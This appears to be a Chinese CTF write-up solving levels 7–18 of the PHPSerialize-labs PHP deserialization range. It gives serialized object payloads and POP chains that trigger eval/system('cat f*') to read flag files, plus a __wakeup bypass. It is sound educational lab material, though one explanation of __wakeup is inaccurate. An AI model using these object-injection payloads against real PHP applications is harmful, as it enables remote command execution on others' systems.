---
title: "PHPSerialize-labs-7-18"
published: 2026-05-27
updated: 2026-05-27
draft: false
description: "这一关考察序列化,直接序列化相关类并且cat fl即可"
image: ""
tags:
  - PHP反序列化
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

### 第七关 

这一关考察序列化,直接序列化相关类并且`cat fl*`即可

```php
<?php
class FLAG{
    public $flag_command = "system('cat f*');";

    function backdoor(){
        eval($this->flag_command);
    }
}

$a = new FLAG();
$a = serialize($a);
echo $a;

?>
```

```php
O:4:"FLAG":1:{s:12:"flag_command";s:17:"system('cat f*');";}
```

### 第八关

```php
<?php
	  
class RELFLAG {

    public function __construct()
    {
        global $flag;
        $flag = 0;
        $flag++;

    }
    public function __destruct()
    {
        global $flag;
        $flag++;

    }
}
$code = new RELFLAG('code');
$a=serialize($code);

unserialize($a);
unserialize($a);
unserialize($a);
unserialize($a);

unset($code);

echo $flag;
	  
?>
```

让$a不断反序列化但是不指定给对象让它自己销毁即可,但是为了在`post`请求中输出一条完整的命令

```php
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));
```

### 第九关

```php
<?php
class FLAG {
    var $flag_command = "system('cat /f*');";
    public function __destruct()
    {
        eval ($this->flag_command);
    }
}

$a = new FLAG();
echo serialize($a);
?>
```

```php
o=O:4:"FLAG":1:{s:12:"flag_command";s:13:"system('ls');";}
```

我拿这个命令看了下,没有`flag.php`或者`fl*`等文件,还是我的本地环境不合适,这个靶场我是通过`lingjing`一键部署的,存在一些问题

```php
O:4:"FLAG":1:{s:12:"flag_command";s:18:"system('cat /f*');";}
```

### 第十关

```php
<?php
class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

$a = new FLAG();
echo serialize($a);
?>
```

`__wake_up`魔术方法会在对象序列化时调用,直接序列化就行

```php
o=O:4:"FLAG":0:{}
```

### 第十一关

```php
<?php
class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}

$a = new FLAG();
echo serialize($a);
//$c = 'O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}';
//echo unserialize($c);
?>
```

让object的包含的属性多一个就行

```php
0=O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

### 第十三关

```php
o=echo $obj;
```

### 第十四关

```php
o=$obj('get_flag');
```

### 第十五关

```php
<?php

/*
--- HelloCTF - 反序列化靶场 关卡 15 : POP链初步 --- 
世界的本质其实就是套娃（x
# -*- coding: utf-8 -*-
# @Author: 探姬(@ProbiusOfficial)
# @Date:   2024-07-01 20:30
# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com
*/

/* FLAG in flag.php */

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}

class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}

class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }

    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
?>
```

```php
o=O:1:"D":1:{s:1:"d";O:10:"destnation":1:{s:3:"cmd";O:1:"A":1:{s:1:"a";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:17:"system('cat f*');";}}}}}
```

总体逻辑是D调用了`destnation`,然后`eval($this->cmd->a->b->c);`,按照这个顺序来就行.

```php

<?php

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}
$objd=new D(new destnation(new A(new B(new C("system('cat f*');")))));
$yes = serialize($objd);
echo $yes;
echo unserialize($yes);
?>
```


### 第十六关

```php

<?php

class A {
    public $a='flag.php';
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}

class B {
    public $b;
    public function __toString() {
        $f = $this->b;
        return $f();
    }
}


class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}

$a = new A();
$b = new B();
$init = new INIT() ;
$b->b = $a;
$init->name = $b;

$ok=serialize($obj);
echo unserialize($ok);
?>
```

```php
o=O:4:"INIT":1:{s:4:"name";O:1:"B":1:{s:1:"b";O:1:"A":1:{s:1:"a";s:8:"flag.php";}}}
```

### 第十七关

```php
class A{
    public $helloctfcmd = "get_flag";
}
```

### 第十八关

```http
http://192.168.242.222:8080/Level18/index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8
```

截断字符串使得条件满足即可
